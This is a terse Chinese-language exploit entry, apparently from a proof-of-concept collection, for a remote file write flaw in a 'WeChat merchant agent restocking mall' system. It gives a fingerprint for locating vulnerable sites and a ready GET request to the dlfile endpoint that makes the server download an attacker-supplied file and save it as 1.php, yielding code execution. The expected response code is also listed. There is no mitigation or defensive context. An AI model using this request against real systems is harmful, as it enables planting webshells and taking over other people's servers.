# 微商代理商补货商城系统存在前台dlfile远程文件写入漏洞(RCE)

- **系统**：微商代理商补货商城系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"/template/mobile/new/static/assets/js/comm.js"`
- **请求**：`GET /home/test/dlfile?file_url=http://127.0.0.1/111.txt&save_to=1.php HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
文件写入到https://ip/1.php中
```
- **预期**：200　|　—